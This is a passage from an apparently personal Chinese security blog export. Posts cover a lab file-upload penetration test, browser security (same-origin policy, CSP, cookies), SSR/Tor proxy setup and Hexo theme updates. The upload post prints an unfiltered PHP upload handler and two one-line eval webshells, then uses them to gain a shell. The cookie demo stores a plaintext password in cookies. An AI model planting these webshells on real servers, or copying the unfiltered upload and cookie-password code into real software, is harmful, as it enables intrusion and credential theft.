class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload_file.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>php代码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"error:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"upload:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"type:"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"size:"</span>.($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>).<span class="string">"kb&lt;br&gt;"</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"stored in:"</span>.<span class="string">"upload/"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从php代码中可以看到没有对上传文件做任何的过滤，当然现实中这种是极少的，只有在靶机中才会出现。</p>
<p>我这里上传了两个php文件，都是一句话木马，只是数据上传方式不同而已，一个是post，一个是get</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33FKKA.png" alt="33FKKA.png"></p>
<p><img src="https://s2.ax1x.com/2020/03/03/3fGQKK.png" alt="3fGQKK.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>@的作用是用来不显示报错的</p>
<p><img src="https://s2.ax1x.com/2020/02/23/31b5U1.png" alt="31b5U1.png"></p>
<p>这个是get类型的一句话木马</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33i9Tf.png" alt="33i9Tf.png"></p>
<p>这个是post类型的一句话木马（图中用的是chrome的hackbar插件）</p>
<p>这样就将一个webshell上传到了服务器了，我们用中国菜刀连接获得权限：</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33Ah4K.png" alt="33Ah4K.png"></p>
<p>连接到了就拿取了靶机的shell</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33AXUP.png" alt="33AXUP.png"></p>
<p>我们可以在靶机桌面上新建一个文件，写一句话</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33ZNBd.png" alt="33ZNBd.png"></p>
<p><img src="https://s2.ax1x.com/2020/02/23/33VT0A.png" alt="33VT0A.png"></p>
<p>这样我们可以看到靶机的桌面上就有了一个文本文件，里面就包含了这句话</p>
<p><img src="https://s2.ax1x.com/2020/02/23/33ZI3T.png" alt="33ZI3T.png"></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>​        这一次的渗透测试很简单，主要是尝试一些工具的使用和环境的配置以及网站的搭建（有点不成功的），也没有多少难度，最主要的是服务器后端php代码没有严格对上传文件的过滤检查，才是造成文件上传漏洞的成因，这一点是对网站搭建人员要注意和留心的，之后我会尝试写一些过滤方案，以及绕过的方法（因为没有绝对安全的系统）。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>文件上传漏洞</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器安全</title>
    <url>/2020/02/18/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="浏览器安全"><a href="#浏览器安全" class="headerlink" title="浏览器安全"></a>浏览器安全</h1><p>​        浏览器的安全策略有很多，比如同源策略，csp，cookie设置，以及浏览器沙箱等，都是游览器安全策略的内容。本文用于记录和理解这些设施，随时扩充，不断学习。</p>
<a id="more"></a>

<h2 id="同源策略-same-origin-policy"><a href="#同源策略-same-origin-policy" class="headerlink" title="同源策略 (same-origin policy)"></a>同源策略 (same-origin policy)</h2><p>​        同源策略是浏览器最核心也最基本的安全功能。</p>
<p>​        内容：在同一个域内，客户端脚本可以任意读写同源内的资源，dom,cookie；但是在不同的域，就不能加载任何资源。即就是不同源的客户端脚本，在没有明确策略，不能访问和修改对方资源。</p>
<p>​        同源：协议，端口，域名三者都相同，称为一个域。</p>
<h2 id="内容安全策略-content-security-policy"><a href="#内容安全策略-content-security-policy" class="headerlink" title="内容安全策略(content-security-policy)"></a>内容安全策略(content-security-policy)</h2><p>​        通过编码在HTTP响应头中的指令来实施策略，用于指定前端网页加载资源的来源。在response中content-security-polity中。(白名单的方式)</p>
<p><code>Content-Security-Polity:script-src &#39;self&#39; https://baidu.com</code></p>
<p>这句的意思是信任来源于百度域名的脚本和当前域名的脚本加载。</p>
<blockquote>
<p><code>default-src</code> : 该指令在某种资源类型指定指令没有被定义的情况下制定了所有资源类型的加载策略(即默认的资源加载策略)</p>
<p><code>script-src</code> : 该指令指定了Web应用程序可以加载的脚本的域或URL</p>
<p><code>object-src</code> : 该指令制定了Web应用程序可以加载的插件，如Falsh</p>
<p><code>style-src</code> : 该指令制定了Web应用程序可以加载的CSS样式表的域或URL</p>
<p><code>img-src</code>: 该指令指定了Web应用程序可以加载的图片的域或URL</p>
<p><code>media-src</code> : 该指令指定了Web应用程序可以加载的音视频的域或URL</p>
<p><code>frame-src</code> : 该指令指定了Web应用程序可以加载的框架的域或URL</p>
<p><code>font-src</code> : 该指令指定了Web应用程序可以加载的字体的域或URL</p>
<p><code>connect-src</code> : 该指令指定了Web应用程序可以加载的像XHR, WebSockets, 以及EventSource等脚本接口的域或URL</p>
<p><code>plugin-types</code> : 该指令指定了哪些MIME类型的插件可以被加载(浏览器支持度不够)</p>
<p><code>form-action</code> : 该指令指定了HTML表单可以提交的URLS(浏览器支持度不够)</p>
<p><code>reflected-xss</code> : 该指令告诉浏览器开启或关闭任何用于过滤或组织反射跨站脚本攻击的启发式算法，这相当于X-XSS-Protection响应头的效果(浏览器支持度不够)</p>
</blockquote>
<p>使用方式：</p>
<ol>
<li>在前端页面<code>&lt;meta&gt;</code>中设置</li>
<li>在服务端设置</li>
</ol>
<h2 id="浏览器沙箱"><a href="#浏览器沙箱" class="headerlink" title="浏览器沙箱"></a>浏览器沙箱</h2><p>​        黑客会在网页中插入一段恶意代码，然后利用浏览器漏洞来执行任意代码，这就叫做 <strong>挂马</strong>。它是浏览器所面对的一种主要的威胁。</p>
<p>​        浏览器为了应对 “挂马” 威胁，从<strong>单进程架构</strong>转变为<strong>多进程架构</strong>。浏览器的多进程架构，会分开浏览器的各个功能模块。这样当一个浏览器进程崩溃时，也不会影响到其他的浏览器进程。这个架构能容许多个程序同时运行而互不影响，每个网页标签都是独立于窗口程序而存在，当资源过高或崩溃时，不会因为一个停顿而整个程序当掉。这样做，可以极大地提升用户体验。</p>
<p>​        沙箱设计的目的是为了让不可信的代码运行在一定的环境中，从而限制这些代码访问<strong>隔离区</strong>之外的资源。如果因为某种原因，确实需要访问隔离区外的资源，那么就必须通过的指定的通道，这些通道会进行严格的安全检查，来判断请求的合法性。通道会采取<strong>默认拒绝</strong>的策略，一般采用封装 API 的方式来实现。</p>
<p>​        Chrome 浏览器包含浏览器进程、渲染进程、插件进程以及扩展进程。插件进程，比如 flash、java 等进程会与浏览器进程严格隔离。</p>
<p>​        Chrome 中的每一个<strong>标签页</strong>都是一个沙箱（sandbox）。为了防止“恶意软件破坏用户系统”或“利用标签页影响其他标签页”。沙箱遵循最小权限原则，每个动作的权限都会被限制，仅能运算而无法写入文件和从敏感区域（即受保护区域）读取文件（如我的文档、桌面）。例如在其中一个标签页运作的恶意软件，将无法窃取信用卡号码、干扰鼠标运作，或告诉系统在启动时运行某个程序，并且恶意软件会在标签页关闭时立即中止。</p>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>​        cookie是能够让网站服务器把少量文本数据存储到客户端的硬盘，内存，或是从客户端硬盘，内存读取数据的一种技术。</p>
<p>​        因为HTTP协议是无状态的，web服务器无法区分请求是否来源于同一个浏览器。所以，web服务器需要额外的数据用于维持会话。cookie就用来跟随HTTP请求响应一起被额外传递的数据，用来维持会话和标识用户。</p>
<p>​        当你浏览某个网站的时候，该网站或许会向你的电脑写于一个非常小的文件，里面包含cookie信息，当下次浏览这个网站的时候，浏览器从该文件中提取cookie发送给网站，网站读取到cookie信息，得知你的相关信息，做出相应动作，比如：直接登陆，而无需输入用户名密码。</p>
<p>​        cookie按照存储的位置分为两种：内存cookie和硬盘cookie。内存cookie由浏览器维护，保存在内存中，浏览器关闭后就消失，存在时间短，而硬盘cookie保存在硬盘里，存在时期长。</p>
<p>​        一个用户电脑可以具有多个cookie，分别存储不同网站的信息，但是一个网站只能读取该网站本身放置在电脑的cookie，无法得知其他cookie信息。cookie大小最多也只能在4kb左右。</p>
<p>现在我在本地写了一个cs架构的登陆页面</p>
<p><img src="https://s1.ax1x.com/2020/03/13/8nSAHK.png" alt="8nSAHK.png"></p>
<p>这里的勾选记住用户在后端会向客户端写入cookie，而忘记用户则会将cookie删掉，现在我们抓包查看</p>
<p><img src="https://s1.ax1x.com/2020/03/13/8npqoT.png" alt="8npqoT.png"></p>
<p>此时，我们勾选了这个check，而服务器响应头中有了set-cookie字段，并向客户端写入了cookie</p>
<p>如果我们再次登陆，则会有：</p>
<p><img src="https://s1.ax1x.com/2020/03/13/8nSvrt.png" alt="8nSvrt.png"></p>
<p>我们的请求头中有了cookie字段，并且就是刚才服务器给我们客户端写入的两个cookie键值对，而在服务器端，检测到了我们的cookie值，对客户端做出响应，显示我们再次登陆。</p>
<p>我们用忘记用户来删除cookie，实际应用中，应该是退出登陆，</p>
<p><img src="https://s1.ax1x.com/2020/03/13/8npkxs.png" alt="8npkxs.png"></p>
<p>我选择忘记用户选项，我用来删除cookie的方式是重置cookie有效时间是一个过去的时间，那么cookie则会过期并且被删除，此时服务端响应头中正是设置cookie为一个过去时间。</p>
<p>以下为源码：（代码简陋，主要用于抓包分析）</p>
<p>前端：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>登陆<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>用户登陆</span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"cookie.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">id</span>=<span class="string">"user"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"password"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            记住用户</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"check"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            忘记用户</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"uncheck"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>后端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;cookie&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        if (isset($_COOKIE[&quot;user&quot;]) &amp; $_COOKIE[&quot;user&quot;] &#x3D;&#x3D; &quot;admin&quot; &amp; $_COOKIE[&quot;password&quot;] &#x3D;&#x3D; &quot;password&quot;) &#123;</span><br><span class="line">            echo &quot;欢迎&quot;.$_COOKIE[&quot;user&quot;].&quot;再次登录！&lt;br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        elseif ($_POST[&quot;user&quot;] &#x3D;&#x3D; &quot;admin&quot; &amp; $_POST[&quot;password&quot;] &#x3D;&#x3D; &quot;password&quot;) &#123;</span><br><span class="line">            echo &quot;欢迎&quot;.$_POST[&quot;user&quot;].&quot;！&lt;br&gt;&quot;;</span><br><span class="line">            if (isset($_POST[&quot;check&quot;])) &#123;</span><br><span class="line">                $expire&#x3D;time()+60;</span><br><span class="line">                setcookie(&quot;user&quot;, &quot;admin&quot;, $expire);</span><br><span class="line">                setcookie(&quot;password&quot;, &quot;password&quot;, $expire);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            echo &quot;登陆失败?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if (isset($_POST[&quot;uncheck&quot;])) &#123;</span><br><span class="line">            setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);</span><br><span class="line">            setcookie(&quot;password&quot;, &quot;&quot;, time()-3600);</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>同源策略</tag>
        <tag>内容安全策略</tag>
      </tags>
  </entry>
  <entry>
    <title>VPN相关设置-shadowsocksR</title>
    <url>/2020/02/14/VPN%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE-shadowsocksR/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        之前一直用的my2one的服务器代理，pc和移动端也用的ShadowsocksR，也就是SSR，一些设置之前也是用的my2one给的教程，一直没手动设置过，现在想用用TOR游览器，不过开始之前先把VPN设置好，别暴露了自己的IP和位置。</p>
<p>（更新：使用tor游览器访问暗网）</p>
<a id="more"></a>

<h2 id="VPN三种系统代理模式"><a href="#VPN三种系统代理模式" class="headerlink" title="VPN三种系统代理模式"></a>VPN三种系统代理模式</h2><p>​        vpn的系统代理有三种模式，分别是直连模式，全局模式和PAC模式。</p>
<p>​        直连模式，顾名思义就是主机在数据交互时候不使用vpn代理，和没开vpn是一样的，在不使用vpn的场合可以用到直连模式。</p>
<p>​        全局模式，就是将主机所有的数据交互都要经过vpn服务器的代理，也就是主机在通信的时候经过了第三方代理，此时可以隐藏主机的IP地址，当然，也可以绕过GFW。</p>
<p>​        PAC模式，就是主机在连接网站的时候读取PAC文件里面的规则，查看网站是否被墙，如果符合，那就开启VPN服务进行代理，而PAC列表一般从GFWList进行更新。</p>
<h2 id="用SSR-Proxy-SwitchyOmega进行网站代理"><a href="#用SSR-Proxy-SwitchyOmega进行网站代理" class="headerlink" title="用SSR+Proxy SwitchyOmega进行网站代理"></a>用SSR+Proxy SwitchyOmega进行网站代理</h2><p>​        SSR这边我订阅了my2one的服务器，这边代理规则我设置为绕过局域网和大陆，不过我在SSR这边选项设置了端口6666为代理端口，把系统代理设置为直连，这样只会将主机走6666端口的数据进行代理。</p>
<p>​        Proxy SwitchyOmega这边先设置了一个proxy的情景模式，让本地6666端口做代理。</p>
<p>​        然后再设置一个 auto switch 的自动切换模式，导入AutoProxy的格式的规则列表，网址为<a href="https://github.com/gfwlist/gfwlist/raw/master/gfwlist.txt" target="_blank" rel="noopener">https://github.com/gfwlist/gfwlist/raw/master/gfwlist.txt</a></p>
<p>​        按照规则列表匹配请求，让它们过proxy情景模式，剩下的都直接连接。</p>
<h2 id="番外：如何访问暗网"><a href="#番外：如何访问暗网" class="headerlink" title="番外：如何访问暗网"></a>番外：如何访问暗网</h2><p>​         <strong>警告：</strong> 在继续之前，重要的是要了解Dark Web上的许多内容都是非法的。 无论你采取什么预防措施，都不可能保持匿名。 自担风险！</p>
<h3 id="Tor工作原理"><a href="#Tor工作原理" class="headerlink" title="Tor工作原理"></a>Tor工作原理</h3><p>​        Tor由已经安装了Tor软件的电脑连接网络而成。它之所以被称为onion，是因为它的结构就跟洋葱相同，你只能看出它的外表，而想要看到核心，就必须把它层层的剥开。即每个路由器间的传输都经过点对点密钥来加密，形成有层次的结构。它中间所经过的各节点，都好像洋葱的一层皮，把客户端包在里面，算是保护信息来源的一种方式。</p>
<p>​        用 Tor 创建一条私有网络路径时，用户的软件或客户端通过网络上的中继递增地建立一条由若干加密连接组成的环路。环路一次扩展一跳，环路上的中继仅仅知道它从哪一个中继接收数据以及向哪一个中继发送数据。没有一台单独的中继会知道数据包的完整路径。客户端与环路上的每一跳都协商一组独立的密钥，这样可以保证数据通过任何一跳时都无法跟踪。</p>
<ol>
<li><p>下载 tor游览器（如果是在国内，你需要一个梯子），下载地址 <a href="https://www.torproject.org/zh-CN/download/" target="_blank" rel="noopener">https://www.torproject.org/zh-CN/download/</a></p>
</li>
<li><p>安装并配置tor，tor安装有中文，所以很好安装，此处不再赘述。</p>
<p>配置的时候我们知道国内是无法直连的，所以我们要选择configure来配置代理，然后在你的网络提供商是否对Tor网络进行了封锁或审查这里选yes。</p>
<p>然后选择在中国可连的网桥meek-azure。</p>
<p>在高级配置中使用代理访问网络，上面我用到SSR中对本机6666端口进行了代理，所以这里填写了socks 5，地址127.0.0.1和端口6666</p>
</li>
</ol>
<ol start="3">
<li>登陆DuckDuckGo，也就是暗网的Google，查看是否能登陆。（注意，暗网的访问速度一般都很慢。）地址为<a href="https://3g2upl4pq6kufc4m.onion/" target="_blank" rel="noopener">https://3g2upl4pq6kufc4m.onion/</a></li>
</ol>
]]></content>
      <categories>
        <category>相关配置</category>
      </categories>
      <tags>
        <tag>VPN</tag>
        <tag>ShadowsocksR</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo next主题更新</title>
    <url>/2020/02/13/hexo-next%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<h1 id="hexo-next主题更新"><a href="#hexo-next主题更新" class="headerlink" title="hexo next主题更新"></a>hexo next主题更新</h1><p>next主题设置文档链接：<a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">http://theme-next.iissnan.com/</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        因为我之前用hexo搭建个人博客的时候一直使用的是next主题，不过在最近的一次next主题配置设置的时候，发现配置文件_config.YML中有很多我没有的选项，结果发现我的next版本是5.1.4，现在我要将它更新到7.4。</p>
<p>​        想着next主题更新的话，顺便也可以更新下hexo，但是发现我就是当前最新版4.2.0，那就只更新一下next就行。</p>
<a id="more"></a>

<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ul>
<li>本地保存旧版本数据</li>
<li>下载新版本</li>
<li>更新设置新版本</li>
</ul>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>​        直接把next主题配置文件_config.YML复制一份，然后直接把<code>theme/next</code>目录删掉</p>
<p>​        然后从新地址安装最新版 NexT 主题</p>
<p>​        <code>git clone https://github.com/theme-next/hexo-theme-next themes/next</code></p>
<p>​        如果下载很慢 , 或者下载失败 , 也可以直接到 <a href="https://github.com/theme-next/hexo-theme-next下载源文件" target="_blank" rel="noopener">https://github.com/theme-next/hexo-theme-next下载源文件</a> , 点击左侧的 <code>Clone or download</code> , 然后点击 <code>Download ZIP</code> , 下载到本地后 , 在 Hexo 的 <code>\themes</code> 文件夹下创建 <code>next</code> 文件夹 , 然后将 zip 文件解压到这个目录即可</p>
<h2 id="更新配置"><a href="#更新配置" class="headerlink" title="更新配置"></a>更新配置</h2><p>​        对照一下旧版的配置文件和新下载的配置文件修改一下即可。</p>
<h3 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a>设置语言</h3><p>​        <code>language: zh-cn</code></p>
<h3 id="主题选项"><a href="#主题选项" class="headerlink" title="主题选项"></a>主题选项</h3><p>​        使用Mist主题 <code>scheme: Mist</code></p>
<h3 id="侧边栏社交链接"><a href="#侧边栏社交链接" class="headerlink" title="侧边栏社交链接"></a>侧边栏社交链接</h3><p>​        在<code>social</code>选段中设置，我这边设置了自己的github和Email</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">GitHub:</span> <span class="string">https://github.com/BMooS</span> <span class="string">||</span> <span class="string">github</span></span><br><span class="line"><span class="attr">E-Mail:</span> <span class="string">mailto:slibo921@gmail.com</span> <span class="string">||</span> <span class="string">envelope</span></span><br></pre></td></tr></table></figure>

<h3 id="友链设置"><a href="#友链设置" class="headerlink" title="友链设置"></a>友链设置</h3><p>​        在<code>links</code>选段下，我设置了自己的码云地址</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="attr">My-gitee:</span> <span class="string">https://gitee.com/BMooS</span></span><br></pre></td></tr></table></figure>

<h3 id="头像设置"><a href="#头像设置" class="headerlink" title="头像设置"></a>头像设置</h3><p>​        在<code>avatar</code>选段下，发现新版本对头像提供了一些新的选项，之后再去研究研究</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="comment"># Replace the default image and set the url here.</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">https://s2.ax1x.com/2020/01/15/lOIrB4.jpg</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be dispalyed in circle.</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># If true, the avatar will be rotated with the cursor.</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="百度的站长统计"><a href="#百度的站长统计" class="headerlink" title="百度的站长统计"></a>百度的站长统计</h3><p>​        在<code>baidu_analytics</code>选段下，相关的在next文档里有</p>
<h3 id="不蒜子统计"><a href="#不蒜子统计" class="headerlink" title="不蒜子统计"></a>不蒜子统计</h3><p>​        在<code>busuanzi_count</code> 选段下，发现新版只需要开启<code>enable: true</code>就行</p>
<h3 id="footer设置"><a href="#footer设置" class="headerlink" title="footer设置"></a>footer设置</h3><p>​        在<code>footer</code>选项下，注释很好的说明了作用，这里不再说</p>
<h3 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h3><p>插件更新</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-wordcount</span><br><span class="line">npm install hexo-symbols-count-time --save</span><br></pre></td></tr></table></figure>

<p>配置主题文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">item_text_post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">awl:</span> <span class="number">4</span></span><br><span class="line">  <span class="attr">wpm:</span> <span class="number">275</span></span><br></pre></td></tr></table></figure>

<h3 id="加入站内搜索"><a href="#加入站内搜索" class="headerlink" title="加入站内搜索"></a>加入站内搜索</h3><p>插件安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>

<p>找到<code>local_search</code>选段，开启<code>enable: true</code></p>
<h3 id="关于背景动画设置的问题"><a href="#关于背景动画设置的问题" class="headerlink" title="关于背景动画设置的问题"></a>关于背景动画设置的问题</h3><p>关于canvas_nest背景动画</p>
<ol>
<li><p>进入themes/next目录</p>
<ol start="2">
<li><p>执行命令：<br><code>git clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest</code></p>
<p>（实际上就是将一个显示动效的js文件clone到对应目录）</p>
</li>
<li><p>这时将配置文件_config.yml中的canvas_nest: false改为canvas_nest: true才能真正生效。</p>
</li>
</ol>
</li>
</ol>
<p>关于three背景动画(3D的，太卡了。。。)</p>
<ol>
<li><p>进入themes/next目录</p>
<ol start="2">
<li><p>执行命令：<br><code>git clone https://github.com/theme-next/theme-next-three source/lib/three</code></p>
<p>（实际上就是将一个显示动效的js文件clone到对应目录）</p>
</li>
<li><p>这时将配置文件_config.yml中的three: false改为three: true才能真正生效。</p>
</li>
</ol>
</li>
</ol>
<p>这是我的canvas_nest设置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">true</span> <span class="comment"># Display on mobile or not</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">"0,0,0"</span> <span class="comment"># RGB values, use `,` to separate</span></span><br><span class="line">  <span class="attr">opacity:</span> <span class="number">0.6</span> <span class="comment"># The opacity of line: 0~1</span></span><br><span class="line">  <span class="attr">zIndex:</span> <span class="number">-1</span> <span class="comment"># z-index property of the background</span></span><br><span class="line">  <span class="attr">count:</span> <span class="number">150</span> <span class="comment"># The number of lines</span></span><br></pre></td></tr></table></figure>

<p>还有一些配置更改以后展开，现在还是摸索摸索。</p>
]]></content>
      <categories>
        <category>相关配置</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next主题</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo相关问题</title>
    <url>/2020/02/13/hexo%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h1><p>hexo中文文档链接：<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></p>
<a id="more"></a>



<ol>
<li><p>建站：<code>hexo init &lt;文件夹名称&gt;</code></p>
</li>
